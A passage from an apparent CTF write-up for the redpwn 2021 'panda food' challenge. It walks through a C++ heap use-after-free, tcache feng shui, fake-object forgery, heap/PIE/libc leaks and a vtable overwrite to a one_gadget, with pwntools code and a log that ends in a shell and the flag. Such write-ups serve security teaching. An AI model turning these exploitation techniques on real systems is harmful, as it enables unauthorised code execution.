+</span></span><span class=line><span class=cl><span class=mh>0x00007f2678a63000</span> <span class=mh>0x00007f2678a86000</span> <span class=mh>0x0000000000001000</span> <span class=n>r</span><span class=o>-</span><span class=n>x</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>ld</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2678a86000</span> <span class=mh>0x00007f2678a8e000</span> <span class=mh>0x0000000000024000</span> <span class=n>r</span><span class=o>--</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>ld</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2678a8f000</span> <span class=mh>0x00007f2678a90000</span> <span class=mh>0x000000000002c000</span> <span class=n>r</span><span class=o>--</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>ld</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2678a90000</span> <span class=mh>0x00007f2678a91000</span> <span class=mh>0x000000000002d000</span> <span class=n>rw</span><span class=o>-</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>ld</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2678a91000</span> <span class=mh>0x00007f2678a92000</span> <span class=mh>0x0000000000000000</span> <span class=n>rw</span><span class=o>-</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007fffb3172000</span> <span class=mh>0x00007fffb3193000</span> <span class=mh>0x0000000000000000</span> <span class=n>rw</span><span class=o>-</span> <span class=p>[</span><span class=n>stack</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007fffb31b6000</span> <span class=mh>0x00007fffb31b9000</span> <span class=mh>0x0000000000000000</span> <span class=n>r</span><span class=o>--</span> <span class=p>[</span><span class=n>vvar</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007fffb31b9000</span> <span class=mh>0x00007fffb31ba000</span> <span class=mh>0x0000000000000000</span> <span class=n>r</span><span class=o>-</span><span class=n>x</span> <span class=p>[</span><span class=n>vdso</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=mh>0xffffffffff600000</span> <span class=mh>0xffffffffff601000</span> <span class=mh>0x0000000000000000</span> <span class=o>--</span><span class=n>x</span> <span class=p>[</span><span class=n>vsyscall</span><span class=p>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>All (readable) addresses are randomised, so I&rsquo;ll have to find a way to leak data otherwise first.</p><h2 id=exploit-hypothesis>Exploit hypothesis</h2><p>After a bit more experimentation, I successfully leak a pointer by doing this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x97</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>fav</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x27</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>printName</span><span class=p>())</span>
+</span></span></code></pre></td></tr></table></div></div><p>Resulting in:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[+] Opening connection to mc.ax on port 31707: Done
+</span></span><span class=line><span class=cl>0x55f53971df10000000000000000000000000000000000000000000000000000055f53971dec00000000000000000000055f53971de90000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000100000001000100
+</span></span></code></pre></td></tr></table></div></div><p>That <code>0x55</code> could be a heap pointer or a PIE pointer, so I do a lot of gdb work to figure out that this primitive leaks data from the tcache, and that the pointers leaked above are necessarily heap pointers.</p><p>Right now, I have</p><ol><li>an unreliable exploit that, when successful, can produce an arbitrary read, as well as RIP control.</li><li>a reliable heap pointer leak</li></ol><p>Since <code>struct Foods</code> are stored on the heap, the pointer to their vtables (which are stored at a PIE address) can be leaked. That PIE leak can be used to further leak a libc address from the GOT, and <em>that</em> leak can be used to overwrite RIP with a one_gadget.</p><p>So, problem solved? Not quite.</p><p>My primitive for arbitrary read / RIP control &mdash; the fake <code>struct Food</code> primitive &mdash; isn&rsquo;t reliable enough to be executed 3 times in succession on a single connection. I need to try something else.</p><h3 id=better-primitives>Better primitives</h3><p>Here&rsquo;s my first idea: find some way to toss the pointer for <code>favorites</code> onto the unsorted bin. Once that&rsquo;s accomplished, <code>favorites->bk</code> should point to somewhere near <code>main_arena</code>, just as how putting <code>favorites</code> on the tcache caused <code>favorites->bk</code> to point to somewhere on the heap. Leaking libc immediately would reduce the number of fake <code>struct Food</code>s required to 1, which was demonstrated prior to be achievable.</p><p>I work on heap feng shui for a really long time, and although I managed to bring the <code>favorites</code> pointer onto the fastbins and the smallbins, it never gets chucked into the unsorted bin.</p><p>Shifting tracks, I move on to work on a better fake <code>struct Food</code> primitive. I run a lot of <code>ltrace</code> experiments, and I eventually come up with a pseudocode understanding of how/when <code>free()</code> and <code>malloc()</code> is called in <code>case 0</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>idx</span> <span class=o>=</span> <span class=n>getidx</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>is_new</span> <span class=o>=</span> <span class=ow>not</span> <span class=n>foods</span><span class=o>.</span><span class=n>count</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>name</span> <span class=o>=</span> <span class=nb>input</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>name</span><span class=o>.</span><span class=n>size</span><span class=p>()</span> <span class=o>&gt;</span> <span class=mh>0xf</span><span class=p>:</span> <span class=c1># if `name` needs name.p</span>
+</span></span><span class=line><span class=cl>    <span class=n>sz</span> <span class=o>=</span> <span class=mi>31</span>
+</span></span><span class=line><span class=cl>    <span class=n>backing_store</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>sz</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>sz</span> <span class=o>&lt;=</span> <span class=n>name</span><span class=o>.</span><span class=n>size</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>        <span class=n>free</span><span class=p>(</span><span class=n>backing_store</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>sz</span> <span class=o>=</span> <span class=n>sz</span><span class=o>*</span><span class=mi>2</span><span class=o>-</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl>        <span class=n>malloc</span><span class=p>(</span><span class=n>sz</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>tmp</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>40</span><span class=p>)</span> <span class=c1># unique &lt;Food&gt; or &lt;Bamboo&gt;</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>name</span><span class=o>.</span><span class=n>size</span><span class=p>()</span> <span class=o>&gt;</span> <span class=mh>0xf</span><span class=p>:</span> <span class=n>tmp</span><span class=o>.</span><span class=n>name_</span><span class=o>.</span><span class=n>p</span> <span class=o>=</span> <span class=n>backing_store</span>
+</span></span><span class=line><span class=cl><span class=n>typ</span> <span class=o>=</span> <span class=n>rand64</span><span class=p>()</span><span class=o>%</span><span class=mi>2</span> <span class=c1># 1 means bamboo</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>typ</span><span class=p>:</span> <span class=n>tmp</span><span class=o>.</span><span class=n>name_</span><span class=o>.</span><span class=n>p</span> <span class=o>=</span> <span class=n>alloc</span><span class=p>(</span><span class=n>name</span><span class=o>.</span><span class=n>size</span><span class=p>()</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=c1># store copy of string</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>is_new</span><span class=p>:</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>48</span><span class=p>)</span> <span class=c1># allocate space for map</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=ow>not</span> <span class=n>is_new</span> <span class=ow>and</span> <span class=n>foods</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span><span class=o>.</span><span class=n>name_</span><span class=o>.</span><span class=n>capacity</span> <span class=o>&gt;</span> <span class=mh>0xf</span><span class=p>:</span> <span class=n>free</span><span class=p>(</span><span class=n>foods</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span><span class=o>.</span><span class=n>name_</span><span class=o>.</span><span class=n>p</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>typ</span><span class=p>:</span> <span class=n>free</span><span class=p>(</span><span class=n>backing_store</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=ow>not</span> <span class=n>is_new</span><span class=p>:</span> <span class=n>free</span><span class=p>(</span><span class=n>foods</span><span class=p>[</span><span class=n>idx</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>foods</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>tmp</span>
+</span></span></code></pre></td></tr></table></div></div><p>I do <em>even more experiments</em>, and I hit a good solution:</p><ol><li>Make sure the tcache is empty; it&rsquo;s LIFO.</li><li>create a new <code>unique_ptr</code> at <code>foods[idx]</code>, where <code>foods[idx]</code> has never been allocated before. Ensure that <code>name.size() > 0x28</code> to keep <code>tcache[size=0x30]</code> empty.</li><li>favorite <code>foods[idx]</code>; repeat step 2. <code>tcache[size=0x30]</code> should <em>only</em> contain <code>favorites</code> now.</li><li>create a new <code>unique_ptr</code> at <code>foods[nidx]</code>, where <code>foods[nidx]</code> has never been allocated before, and <code>name.size()</code> lies within [0x10, 0x18).</li><li>If <code>foods[nidx]</code> was a Bamboo<sup>5</sup>, <code>favorites</code> remains at the top of <code>tcache[size=0x30]</code>, and step 4 should be repeated. Otherwise, <code>favorites</code> was overwritten with the <code>name</code> from step 4.
+<code>favorites</code> has a <code>(1/2)**i</code> chance of being overwritten correctly, where <code>i</code> is the number of times step 4 happens.</li></ol><p>Programmatically:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>fakeFood</span><span class=p>(</span><span class=n>payload</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;creates a fake Food struct containing `payload` at a random `idx`, stored as favorite. returns idx&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=n>randint</span><span class=p>(</span><span class=mi>100</span><span class=p>,</span><span class=mi>1</span><span class=o>&lt;&lt;</span><span class=mi>30</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>alloc</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>fav</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>alloc</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span> <span class=n>alloc</span><span class=p>(</span><span class=n>idx</span><span class=o>+</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span> <span class=n>payload</span><span class=p>[:</span><span class=mh>0x17</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x17</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>idx</span>
+</span></span></code></pre></td></tr></table></div></div><p>This works reliably (1/1024 failure rate), so long as <code>payload</code> contains no whitespace (~1/15 failure rate). Right now, I have:</p><ol><li>a reliable exploit that produces an arbitrary read, as well as RIP control.</li><li>a reliable heap pointer leak</li></ol><p>Can I finish the challenge? Maybe.</p><h3 id=exploitation-minutiae>Exploitation minutiae</h3><p>First of all, I need to figure out the offsets to get from leak-to-leak. The heap base is easy to figure out:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>heapbase</span> <span class=o>=</span> <span class=p>(</span><span class=n>heapleak</span><span class=o>&gt;&gt;</span><span class=mi>12</span><span class=p>)</span><span class=o>&lt;&lt;</span><span class=mi>12</span>
+</span></span></code></pre></td></tr></table></div></div><p>But what do you do with that? I need to find the location of an active <code>struct Food</code> in memory for leaking, so I search for it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>leak</span><span class=p>(</span><span class=n>addr</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>sz</span><span class=p>:</span> <span class=nb>int</span><span class=o>=</span><span class=mi>8</span><span class=p>):</span> <span class=c1># leak the first `sz` bytes from `addr`</span>
+</span></span><span class=line><span class=cl>    <span class=n>fakeFood</span><span class=p>(</span><span class=n>fit</span><span class=p>({</span><span class=mi>8</span><span class=p>:</span><span class=n>addr</span><span class=p>,</span><span class=mh>0x10</span><span class=p>:</span><span class=n>sz</span><span class=o>+</span><span class=mi>8</span><span class=p>}))</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>unpack</span><span class=p>(</span><span class=n>printName</span><span class=p>()[:</span><span class=n>sz</span><span class=p>],</span><span class=s1>&#39;all&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>7</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>search_str</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=si>%s</span><span class=se>\0</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>7</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>foods1_offset</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>i</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>99999</span><span class=p>,</span><span class=mh>0x1000</span><span class=p>)</span> <span class=k>if</span> <span class=n>search_str</span> <span class=ow>in</span> <span class=p>(</span><span class=n>dat</span> <span class=o>:=</span> <span class=n>pack</span><span class=p>(</span><span class=n>leak</span><span class=p>(</span><span class=n>heapbase</span><span class=o>+</span><span class=n>i</span><span class=p>,</span><span class=mh>0x1000</span><span class=p>),</span><span class=s1>&#39;all&#39;</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl><span class=n>foods1_offset</span><span class=o>+=</span> <span class=n>dat</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=n>search_str</span><span class=p>)</span><span class=o>-</span><span class=mh>0x17</span> <span class=c1># -0x17 because that&#39;s the distance from this string to the _vtable.</span>
+</span></span><span class=line><span class=cl><span class=n>PIE_leak</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=n>heapbase</span><span class=o>+</span><span class=n>foods1_offset</span><span class=p>)</span> <span class=c1># this is a leak of `food[idx]-&gt;_vtable`. </span>
+</span></span></code></pre></td></tr></table></div></div><p>The pointer leaked is either <code>Food</code>&rsquo;s vtable or <code>Bamboo</code>&rsquo;s vtable, depending on what <code>food[idx]</code> was.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/blog/redpwn-2021-panda-food/image-20210711113202397.png data-srcset="/blog/redpwn-2021-panda-food/image-20210711113202397.png, /blog/redpwn-2021-panda-food/image-20210711113202397.png 1.5x, /blog/redpwn-2021-panda-food/image-20210711113202397.png 2x" data-sizes=auto alt=/blog/redpwn-2021-panda-food/image-20210711113202397.png title=/blog/redpwn-2021-panda-food/image-20210711113202397.png width=1352 height=580></p><p>I&rsquo;ll use that information to calculate the PIE base:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>checkWhich</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;figure out if foods[idx] was a Bamboo or a Food.
+</span></span></span><span class=line><span class=cl><span class=s1>    Destroys the current `favorite`.&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>fav</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>Eat</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>flush</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;bamboo&#39;</span> <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;crunch&#39;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span> <span class=k>else</span> <span class=sa>b</span><span class=s1>&#39;food&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>pie_leak</span> <span class=o>-</span> <span class=p>(</span><span class=mh>0x2e7d78</span> <span class=k>if</span> <span class=n>checkWhich</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=s1>&#39;bamboo&#39;</span> <span class=k>else</span> <span class=mh>0x2e7d50</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>The next part is almost robotic: leaking libc from the GOT.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>libc_database</span><span class=o>.</span><span class=n>libc_find</span><span class=p>({</span><span class=n>f</span><span class=p>:</span><span class=n>leak</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=n>f</span><span class=p>])</span> <span class=k>for</span> <span class=n>f</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;malloc&#39;</span><span class=p>,</span> <span class=s1>&#39;free&#39;</span><span class=p>]})</span>
+</span></span></code></pre></td></tr></table></div></div><p>Finally, I just need to set <code>favorites->_vtable = &one_gadget</code> to win. I flood the heap with copies of <code>one_gadget</code> and leak out its position accordingly to pop a shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>og</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>select_gadget</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># (2) doesn&#39;t work; memset() in chall.cc was optimised out in the actual binary...</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>og</span><span class=p>)</span><span class=o>*</span><span class=mh>0x1ff</span><span class=p>)</span> <span class=c1># flood the heap with the one_gadget to make finding heap offset easier</span>
+</span></span><span class=line><span class=cl><span class=n>fakeFood</span><span class=p>(</span><span class=n>pack</span><span class=p>(</span><span class=n>heapbase</span><span class=o>+</span><span class=nb>next</span><span class=p>(</span><span class=n>i</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x5000</span><span class=p>,</span><span class=mh>0x800</span><span class=p>)</span> <span class=k>if</span> <span class=n>leak</span><span class=p>(</span><span class=n>heapbase</span><span class=o>+</span><span class=n>i</span><span class=p>)</span> <span class=o>==</span> <span class=n>og</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl><span class=n>flush</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>Eat</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>That&rsquo;s the end. Fun challenge.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Opening</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>mc</span><span class=o>.</span><span class=n>ax</span> <span class=n>on</span> <span class=n>port</span> <span class=mi>31707</span><span class=p>:</span> <span class=n>Done</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>heap</span><span class=p>:</span> <span class=mh>0x559d3b513000</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>PIE</span><span class=p>:</span> <span class=mh>0x559d39fd3000</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>found</span> <span class=n>libc</span><span class=err>!</span> <span class=nb>id</span><span class=p>:</span> <span class=n>libc6_2</span><span class=mf>.27</span><span class=o>-</span><span class=mi>3</span><span class=n>ubuntu1</span><span class=mf>.4</span><span class=n>_amd64</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>one_gadget</span><span class=p>:</span> <span class=mh>0x7f8d39985432</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Switching</span> <span class=n>to</span> <span class=n>interactive</span> <span class=n>mode</span>
+</span></span><span class=line><span class=cl><span class=n>idx</span><span class=p>:</span>
+</span></span><span class=line><span class=cl><span class=n>name</span><span class=p>:</span>
+</span></span><span class=line><span class=cl><span class=n>choice</span><span class=p>:</span>
+</span></span><span class=line><span class=cl><span class=err>$</span> <span class=n>ls</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span><span class=o>.</span><span class=n>txt</span>
+</span></span><span class=line><span class=cl><span class=n>run</span>
+</span></span><span class=line><span class=cl><span class=err>$</span> <span class=n>cat</span> <span class=n>flag</span><span class=o>.</span><span class=n>txt</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span><span class=p>{</span><span class=n>hijacking_vtables_like_321_4243f93</span><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=footnotes>Footnotes</h2><ol><li>Necessarily, this writeup will be riddled with misinformation and mistakes. Don&rsquo;t take this as gospel, read the sources for yourself, and make a PR on this writeup if there&rsquo;s a mistake you really care about.</li><li>This is not the proper terminology and I won&rsquo;t pretend I know what it ought to be.</li><li>This doesn&rsquo;t happen at all in reality. It&rsquo;s almost impossible to remerge any of the allocations back into <code>malloc_arena->top</code>, meaning that most allocations remain confined to their own tcaches (and fastbins/smallbins if necessary), The experiment here worked as a matter of coincidence: when <code>string.size()</code> is in the range [0x10, 0x1f), a <code>malloc(0x1f)</code> call is made to handle it. This just-so-happens to land in <code>tcache[size=0x30]</code>, which is also host to Food/Bamboo structs.</li><li>The odds of crashing are proportional to the number of <code>size=0x30</code> chunks present on the tcache. It&rsquo;s easier to understand once you grasp how <a href=#better-primitives rel>allocations are handled</a>, but in short: the first reallocation (<code>'A'</code>) puts <code>foods[2]</code> on <code>tcache[size=0x30]</code>. The second allocation will overwrite that chunk with <code>B</code> if its not a <code>Food</code> type, giving baseline odds of 50%. These odds go downhill if the tcache is filled with enough garbage &ndash; something which I didn&rsquo;t draw a connection to until I figured out a consistent exploit primitive.
+In any case, <code>(50%)**3</code> isn&rsquo;t good enough odds for the exploit I want.</li><li>I&rsquo;m still not sure about this part. The code seems to indicate vice versa, but either way it&rsquo;s still a 1/2 chance per loop.</li></ol><h2 id=tldr>TLDR</h2><ul><li><code>free</code> a <code>unique_ptr&lt;Food></code> by overwriting an already existing <code>foods[idx]</code></li><li>saving a <code>Food*</code> pointer in <code>favorite</code> allows for a UAF;</li><li><code>->bk</code> can be used to leak the heap</li><li>Modify the contents of <code>favorite</code> by heap-feng-shui-ing an 0x30 heap chunk onto the backing store for <code>string name</code></li><li>Use modified <code>favorite</code>s to leak PIE from heap, and libc from PIE</li><li>modify <code>favorite</code>&rsquo;s vtable to jump to <code>one_gadget</code></li></ul><h2 id=code>Code</h2><p>note: your libc-database might contain <code>libc6_2.27-3ubuntu1.3_amd64</code>; I removed it because the package for that libc version <a href=archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1.3_amd64.deb rel>appears to be deleted</a>.</p><p>It&rsquo;s also worth noting that this code should succeed both locally <em>and</em> on remote.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
